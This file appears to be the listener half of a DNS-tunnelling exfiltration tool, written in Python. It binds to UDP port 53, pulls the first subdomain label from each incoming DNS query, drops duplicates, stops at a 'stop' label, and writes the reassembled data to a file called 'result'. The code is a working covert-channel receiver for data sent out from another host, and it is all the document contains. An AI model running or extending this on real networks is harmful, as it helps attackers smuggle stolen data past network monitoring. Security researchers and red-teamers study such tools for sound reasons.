import dns.message
import socket
from core import string2file


receive_list = []
tmp = ''

def handler(address, message):
    msg = dns.message.from_wire(message)
    name = msg.question[0].name
    name = str(name).split('.')[0]
    global tmp
    if name == tmp or name == 'stop':
        pass
    else:
        print(f"[+] Receiving: {name}")
        receive_list.append(name)
        tmp = name
    resp = dns.message.make_response(msg)
    s.sendto(resp.to_wire(), address)
    return name

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', 53))
print("[+] I'm listening ...")
flag = ''
while flag != 'stop':
    message, address = s.recvfrom(1024)
    flag = handler(address, message)
string2file(''.join(receive_list), 'result')
